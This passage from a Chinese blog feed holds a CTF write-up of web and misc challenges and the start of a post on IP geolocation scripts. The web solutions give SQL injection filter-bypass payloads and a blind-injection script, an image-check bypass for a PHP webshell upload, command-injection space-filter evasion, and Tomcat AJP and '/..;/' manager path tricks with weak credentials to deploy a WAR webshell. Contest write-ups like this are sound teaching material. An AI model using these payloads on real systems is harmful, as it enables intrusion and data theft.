class="hljs-number">333</span>*<span class="hljs-number">777</span>*<span class="hljs-number">444</span>*<span class="hljs-number">33</span>*<span class="hljs-number">66</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>按的时候用 * 分隔了一下，对着键盘看一下就完事了。</p><p><img src="https://s1.ax1x.com/2020/03/30/GnaR76.png" alt="GnaR76.png"></p><p>参考工具在 Gayhub 上搜 dtmf 第一个就是，环境是 Python2</p><p>写脚本把数字替换成字母也很方便，这里不写了。（懒</p><h2 id="Alison-likes-jojo-13-solves"><a href="#Alison-likes-jojo-13-solves" class="headerlink" title="Alison likes jojo - 13 solves"></a>Alison likes jojo - 13 solves</h2><blockquote><p>Author: Alison</p></blockquote><p>Alison 大腿子友情出的题目，还是去年给我的，连饭都没吃，我可感动了。</p><p>打开压缩包我们可以看到两张图片，先 binwalk 一下第一张图片</p><p><img src="https://s1.ax1x.com/2020/03/30/GndPun.jpg" alt="GndPun.jpg"></p><p>有一个压缩包，这里我用 foremost 分离</p><p><img src="https://s1.ax1x.com/2020/03/30/GnddKA.jpg" alt="GnddKA.jpg"></p><p>进去发现压缩包，解压要密码，用 fcrackzip 跑一下kali自带的rockyou字典，几秒就出来了</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnd9js.jpg" alt="Gnd9js.jpg"></p><p>解压之后发现有个txt，base64几下就可以得到 <code>killerqueen</code>，不知道有什么用，但给出来一定有用，另一个图片是 jpg，所以我们可以尝试与 jpg 有关的隐写工具，这里是 <code>outguess</code>。之前得到的就是key，提取出来就是flag。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndpcj.jpg" alt="Gndpcj.jpg"></p><h2 id="爬-31-solves"><a href="#爬-31-solves" class="headerlink" title="爬 - 31 solves"></a>爬 - 31 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>又是一个送分题，我doc把flag放进图片的底部然后转成pdf。预期解是用Photoshop打开可以看到另一张图，不过wps或者其它可以编辑pdf的软件打开直接把图片移开也是可以的。。。这里就不多说了。</p><h2 id="调查问卷-58-solves"><a href="#调查问卷-58-solves" class="headerlink" title="调查问卷 - 58 solves"></a>调查问卷 - 58 solves</h2><p>填问卷得分，Google的问卷需要科学上网一下。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin-90-solves"><a href="#checkin-90-solves" class="headerlink" title="checkin - 90 solves"></a>checkin - 90 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>打开界面问作者，作者在题目都会说明，输入栏限制了最长3个，按钮又不让你按，于是改前端：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWzX6.png" alt="GnWzX6.png"></p><p>然后弹出一个框框，提示为远古的博客（博客托管在 GitHub，刚好Github比赛前一天又出事了，一度焦虑）</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWx6x.png" alt="GnWx6x.png"></p><p>进去看看，在主页就有一半的 flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnf90O.png" alt="Gnf90O.png"></p><p>这里有一个小心机，第一次看的时候肯定以为没有放全，等反应过来的时候开始回删了，所以得审前端或者再等一遍（逃</p><p>然后远古的博客，灵感来自于 ctfhub 的彩蛋题，文章是按时间排序的，那么翻到最后一页发现有个 1970 年的博客，文章底部就有另一半的 flag，这个就是签到题，我想了最久的一道题。</p><p>ps：那篇文章很有意义，可以看看，嘻嘻。</p><h2 id="admin-70-solves"><a href="#admin-70-solves" class="headerlink" title="admin - 70 solves"></a>admin - 70 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p><strong>login as admin</strong></p><p>这题一开始万能密码就能拿flag，后来觉得太简单了，加点基础内容，登录框首先万能密码就能绕过，当然弱口令也可以，admin&#x2F;admin123456，不过不建议爆破。。。好几次都打down了。</p><p><strong>本地ip</strong></p><p>加 xff 头部就可以绕过了：<code>X-Forwarded-For:127.0.0.1</code>，用一些浏览器插件就可以解决了，Hackbar 也可以 add header</p><p>接下来 GET 传参 <code>ais=520</code> 和 POST 传参 <code>wust=1314</code> 就可以了，最后拿到一个被分解的 url，是 paste.ubuntu 网站的一个粘贴代码的地方，相信新生学c语言的时候没少用。。。所以很容易猜出来，又是排列组合，最多6次，去到网站后得到一串base64，解码得flag</p><h2 id="CV-Maker-43-solves"><a href="#CV-Maker-43-solves" class="headerlink" title="CV Maker - 43 solves"></a>CV Maker - 43 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题其实是有点问题，代码写得不太好，一开始在纠结过滤 <code>ph</code> 还是 <code>htaccess</code>，就先都写上去，结果最后忘了删。。。最后直接php就能上传了，谢谢 <code>Y1ng</code> 师傅指出。而且不是动态靶机应该做一下 <code>sandbox</code>，因为一开始只是想给十几个人打的没想那么多。。。后来还是大意了。</p><p>打开界面就是一个主页，要注册什么的（这里放了一个小彩蛋，不知道大家有没有注意到</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfpnK.png" alt="GnfpnK.png"></p><p>然后注册进去就是一个个人信息的界面，这里非常贴心的把网站所有功能全部去掉了，把头像上传放到了最显眼的地方，那就是文件上传了。</p><p>然后上传一个图片，更改头像后发现f12可以看到文件路径，于是上传一句话试试，发现非常贴心地返回：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfRHO.png" alt="GnfRHO.png"></p><p>那就是用 exif_imagetype() 来检测是不是图片，这个很简单，文件头加 <code>GIF89a</code> 就可以了，上传上去后缀还是php，这里设置得很简单，然后蚁剑连上去，可以在根目录上有flag。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnf44H.png" alt="Gnf44H.png"></p><p>但是打开为空，考虑权限问题，但是很贴心地准备了readflag，运行得flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnfo8A.png" alt="Gnfo8A.png"></p><h2 id="朴实无华-24-solves"><a href="#朴实无华-24-solves" class="headerlink" title="朴实无华 - 24 solves"></a>朴实无华 - 24 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>枯燥的代码审计，打开是一个 hackme，注意到标题有 <code>人间极乐bot</code>，很容易就知道去 <code>robots.txt</code> 看看，可以得到</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/fAke_f1agggg.php<br></code></pre></td></tr></table></figure><p>访问发现有个假flag，f12看报文可以察觉到一个头部：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfICd.png" alt="GnfICd.png"></p><p>于是就进入到朱一旦的枯燥页面。</p><p>接下来就是代码审计了。</p><p><strong>intval</strong></p><p>这个比较常见了，<code>intval()</code> 在处理16进制时存在问题，但强制转换时是正常的，intval(字符串)为0，但是intval(字符串+1) 会自动转换成数值的，php7里面修复了这个东西，这里输入 <code>0x1234</code> 即可绕过。</p><p><strong>MD5</strong></p><p>这个考察php的弱等于，当两边为0e的时候，php会解析为0，当然 0e 后面得是数字。</p><p>写个脚本跑个几分钟就有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-keyword">global</span> dict_az<br>dict_az = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = <span class="hljs-string">&#x27;0e&#x27;</span><br>result += <span class="hljs-built_in">str</span>(i)<br>i = i + <span class="hljs-number">1</span><br>hashed_s = hashlib.md5(result.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>r = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;^0e[0-9]&#123;30&#125;&#x27;</span>, hashed_s)<br><span class="hljs-keyword">if</span> r:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result, hashed_s))<br>exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> i % <span class="hljs-number">1000000</span> == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] current value: &#123;&#125;       &#123;&#125; iterations, continue...&quot;</span>.<span class="hljs-built_in">format</span>(result, <span class="hljs-built_in">str</span>(i)))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br><span class="hljs-comment"># 0e215962017</span><br></code></pre></td></tr></table></figure><p><strong>命令执行</strong></p><p>这里过滤了空格和cat，空格的话一搜就有很多，比如 <code>%09</code>，<code>$&#123;IFS&#125;</code>等等，这里用 <code>%09</code> 为例，cat的话换成tac就可以了。</p><p>首先 ls 一下看见那个巨傻的flag名，然后 <code>tac%09flll*</code> 就可以读到flag了。</p><h2 id="颜值成绩查询-14-solves"><a href="#颜值成绩查询-14-solves" class="headerlink" title="颜值成绩查询 - 14 solves"></a>颜值成绩查询 - 14 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>常规的 sql 注入题目，这里过滤了空格和union，同时检查了 UA，带 <code>sqlmap</code> 的就 die，所以无脑 <code>sqlmap</code> 是不行的。</p><p>解法：用 <code>/**/</code> 代替空格，双写 union 绕过: <code>uniunionon</code></p><p>首先用order by把列数猜出来，这里是3，union 查询必须列数相等。</p><p>然后查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<br>绕过方式如上<br></code></pre></td></tr></table></figure><p>查列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>flag<br>绕过方式如上<br></code></pre></td></tr></table></figure><p>可以发现flag表中有flag和value，直接查value即可。</p><p>payload: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?stunum<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span>uniounionn<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">value</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag#<br></code></pre></td></tr></table></figure><p>后来发现好多人是盲注跑出来的，当然也可以，这里给出 <code>Y1ng</code> 师傅的 <code>exp</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#颖奇L&#x27;Amore www.gem-love.com #转载请勿删除水印</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br>res = <span class="hljs-string">&#x27;&#x27;</span><br>alphabet = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;X&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphabet:<br><span class="hljs-comment"># information_schema,ctf</span><br><span class="hljs-comment"># payload = &quot;select/**/group_concat(schema_name)/**/from/**/information_schema.schemata&quot;</span><br><br><span class="hljs-comment">#flag,score</span><br><span class="hljs-comment"># payload = &quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot; </span><br><br><span class="hljs-comment">#flag,value,id,name,score</span><br><span class="hljs-comment"># payload = &#x27;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&#x27;</span><br><br><span class="hljs-comment">#wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span><br>payload = <span class="hljs-string">&quot;select/**/group_concat(value)/**/from/**/flag&quot;</span><br>payload = quote(payload)<br>url=<span class="hljs-string">&#x27;http://101.200.53.102:10114/?stunum=2/(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(payload, i, <span class="hljs-built_in">ord</span>(char))<br>r = requests.get(url)<br><span class="hljs-comment"># print(r.text[2473:2499])</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;666&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>res += char<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="easyweb-23-solves"><a href="#easyweb-23-solves" class="headerlink" title="easyweb - 23 solves"></a>easyweb - 23 solves</h2><blockquote><p>Author: longofo</p></blockquote><p>这个题目考点就是上个月 tomcat 的 CVE，也是比赛前一天才决定放上去的，一开始我只想着读个flag就算了，但学长觉得直接读太没意思了，事实证明确实如此。</p><p>解题：配合上传文件，任意类型都可以，然后利用ajp在uri路径带jsp后缀时包含上传的文件并解析为jsp，通过rce，用命令find匹配flag。</p><p>一开始是想提示具体漏洞的，但是后来发现有几个师傅都做出来了就觉得还是可以的。</p><p>首先就是用 poc 读发现可以读到</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhPK0.png" alt="GnhPK0.png"></p><p>预期解是上传一个🐎，执行后回显，然后通过poc去读自己的🐎，但是因为是临时出题，所以有了一些非预期解，有师傅找到我说读 <code>/home/tomajp/.bashrc_history</code> 可以读到flag的位置。。。这个是真的没想到</p><p>下面是预期解解法：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhAVU.png" alt="GnhAVU.png"></p><p>然后用poc读命令，本地测试 <code>ipconfig</code> ，可以得到回显。</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhFbT.png" alt="GnhFbT.png"></p><p>这样直接执行 find 命令来找 flag 的字眼，就可以在根目录上找到有一个叫 <code>flaaaag</code> 的目录，目录里面有一个 <code>what_you_want</code> 的文件，执行命令 <code>cat /flaaaag/what_you_want</code> 即可读到flag。</p><h2 id="train-yourself-to-be-godly-1-solves"><a href="#train-yourself-to-be-godly-1-solves" class="headerlink" title="train yourself to be godly - 1 solves"></a>train yourself to be godly - 1 solves</h2><blockquote><p>Author: longofo</p></blockquote><p>页面是 examples，其实洞不在这里，好像一般人很难想得到，肯定得需要 hint，于是就有了 Orange 大哥在 BlackHat 上的一个议题，就是那个 pdf，主要内容就是URL路径参数不规范引发的问题，能造成的危害如下</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4CJH.png" alt="Gn4CJH.png"></p><p>apache中的<code>tomcat/webapps</code>目录如下。</p><p>既然题目是用了examples目录作为网站根目录，那么上图中的Web容器控制台和管理界面这一点就显得很有意思了</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhzdO.png" alt="GnhzdO.png"></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传，也就是第二个hint。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4FSA.png" alt="Gn4FSA.png"></p><p>我们可以看到 pdf 有一个这样的东西，告诉我们可以通过 <code>/..;/manager/html</code> 进入到manager页面。</p><p>并且随便加一串路径，根据报错信息知道我们当前的tomcat的root路径为examlpes</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn49Fe.png" alt="Gn49Fe.png"></p><p>目录穿越到 manager 得输入密码验证，这里是弱密码 <code>tomcat/tomcat</code> </p><p><img src="https://s1.ax1x.com/2020/03/30/Gn43yq.png" alt="Gn43yq.png"></p><p>接下来就是上传 war 包拿 webshell，github挑一个就好了，这里用 LandGrey 的。</p><p>可以直接用<code>jar cvf yourname.war webshell.jsp</code>命令将webshell.jsp打包成war</p><p>选择文件，上传。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn41ln.png" alt="Gn41ln.png"></p><p>根据报错信息明显路径拼结完是example&#x2F;manager&#x2F;html&#x2F;upload，缺少一个&#x2F;..;&#x2F;，加一个再试</p><p>返回一个403，这说明&#x2F;manager&#x2F;html&#x2F;upload路径访问到了，但是权限不够，那一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问<code>/..;/manager/html</code>出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将&#x2F;example换成Path参数指定的&#x2F;manage就行，再把cookie加上就完事了。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4lSs.png" alt="Gn4lSs.png"></p><p>修改post，添加cookie（ps: 由于cookie只能用一次，所以还是403的话，再请求一次<code>/..;/manager/html</code>，更换新的cookie就行了 ），上传完毕后可以看到war已安装好了，访问上传的war，注意这里还有一个<code>/..;/</code>的坑，剩下的就是根据自己的马找flag了。</p><p>当然直接找flag是找不到的，这道题我改得比较玄学，加了《圣经》新约：《提摩太后书》里的文章。（逃</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4MWj.png" alt="Gn4MWj.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4UkF.png" alt="Gn4UkF.png"></p><p>可以看到在Timothy里面，cat 一下，是一段文章，这里知道flag格式，grep一下 wctf2020，就可以看到flag了。</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXUzT.png" alt="GnXUzT.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnXYiq.png" alt="GnXYiq.png"></p><p>In the end, train yourself to be godly.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ip定位获取及反向地址解析</title>
    <link href="/2020/03/21/ip_trace/"/>
    <url>/2020/03/21/ip_trace/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在运维的时候碰到一些恶意访问，恶意操作的情况，有师傅建议我可以挂个ip追踪的脚本，至少可以定位个大概。</p><h1 id="基于百度定位接口的-ip-定位脚本"><a href="#基于百度定位接口的-ip-定位脚本" class="headerlink" title="基于百度定位接口的 ip 定位脚本"></a>基于百度定位接口的 ip 定位脚本</h1><p>百度地图什么的都有类似的接口，这里主要利用了 <a href="http://lbsyun.baidu.com/index.php?title=webapi/ip-api">普通ip定位</a> 和 <a href="http://lbsyun.baidu.com/index.php?title=uri/api/web">反向地址解析</a> 的接口。</p><h2 id="普通-ip-定位"><a href="#普通-ip-定位" class="headerlink" title="普通 ip 定位"></a>普通 ip 定位</h2><p>获取 ip 地址的方法很多，这里就不做介绍，得到的 ip 后，就调用定位的接口，先把 ip 所属地进行查询，一般来说与运行商的基站或者宽带的部署有关，接口是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>api.map.baidu.com<span class="hljs-regexp">/location/i</span>p?ak=开发者的AppKey&amp;ip=这里是ip地址&amp;coor=bd09ll <span class="hljs-regexp">//</span>HTTP协议<br>https:<span class="hljs-regexp">//</span>api.map.baidu.com<span class="hljs-regexp">/location/i</span>p?ak=开发者的AppKey&amp;ip=这里是ip地址&amp;coor=bd09ll <span class="hljs-regexp">//</span>HTTPS协议<br></code></pre></td></tr></table></figure><p>我们从中主要取经纬度坐标，省份城市信息，和节点的信息，返回的是 json 格式，因此还是需要将数据的结构进行分析。</p><ul><li>经度 y 在 <code>content</code> 中 <code>point</code> 的 <code>y</code> 里</li><li>经度 x 在 <code>content</code> 中 <code>point</code> 的 <code>x</code> 里</li><li>省份城市分别在 <code>content</code> 中 <code>address_detail</code> 的 <code>province</code> 、<code>content</code> 中 <code>address_detail</code> 的 <code>city</code>里</li><li>节点信息直接用 <code>address</code> 里的信息就够了</li></ul><p>可以对信息进行输出，然后再把x, y坐标进行存储。</p><p>返回的实例 json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>  <br>    address<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CN|北京|北京|None|CHINANET|1|None&quot;</span><span class="hljs-punctuation">,</span>    #详细地址信息  <br>    content<span class="hljs-punctuation">:</span>    #结构信息  <br>    <span class="hljs-punctuation">&#123;</span>  <br>        address<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;北京市&quot;</span><span class="hljs-punctuation">,</span>    #简要地址信息  <br>        address_detail<span class="hljs-punctuation">:</span>    #结构化地址信息  <br>        <span class="hljs-punctuation">&#123;</span>  <br>            city<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;北京市&quot;</span><span class="hljs-punctuation">,</span>    #城市  <br>            city_code<span class="hljs-punctuation">:</span> <span class="hljs-number">131</span><span class="hljs-punctuation">,</span>    #百度城市代码  <br>            district<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>    #区县  <br>            province<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;北京市&quot;</span><span class="hljs-punctuation">,</span>    #省份      <br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>  <br>        point<span class="hljs-punctuation">:</span>    #当前城市中心点  <br>        <span class="hljs-punctuation">&#123;</span>  <br>            x<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;116.39564504&quot;</span><span class="hljs-punctuation">,</span>    #当前城市中心点经度<br>            y<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;39.92998578&quot;</span>    #当前城市中心点纬度<br>        <span class="hljs-punctuation">&#125;</span>  <br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>  <br>    status<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span>    #结果状态返回码  <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="反向地址解析"><a href="#反向地址解析" class="headerlink" title="反向地址解析"></a>反向地址解析</h2><p>反向地址解析其实可以用到很多优秀的解析接口，但是因为麻烦(穷)所以直接使用百度的接口了。</p><p>用的 api 里的 ak 是直接网上找的，直接用。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//api.map.baidu.com/geocoder/v<span class="hljs-number">2</span>/?ak<span class="hljs-operator">=</span><span class="hljs-number">36</span>fcc<span class="hljs-number">51e203</span><span class="hljs-keyword">c</span><span class="hljs-number">9958959</span>d<span class="hljs-number">419e24238112</span>&amp;callback<span class="hljs-operator">=</span>renderReverse&amp;location<span class="hljs-operator">=</span>y<span class="hljs-punctuation">,</span> <span class="hljs-keyword">x</span>&amp;output<span class="hljs-operator">=</span>json&amp;pois<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;qq-pf-<span class="hljs-keyword">to</span><span class="hljs-operator">=</span>pcqq.<span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p>y 和 x 替换成获取到的坐标，注意有英文逗号分隔。</p><p>接下来就是处理 <code>json</code> 数据了，主要数据在 <code>result</code> 里面，其中：</p><ul><li>默认有一个格式化的地址，<code>formatted_address</code> 。</li><li>还有一些其它的结果，我也把他们作为一个输出，在 <code>result</code> 里有一个 <code>pois</code> 的 key，是一个列表，我们循环进行输出每个元素的 <code>addr</code> 地址即可。</li></ul><h2 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 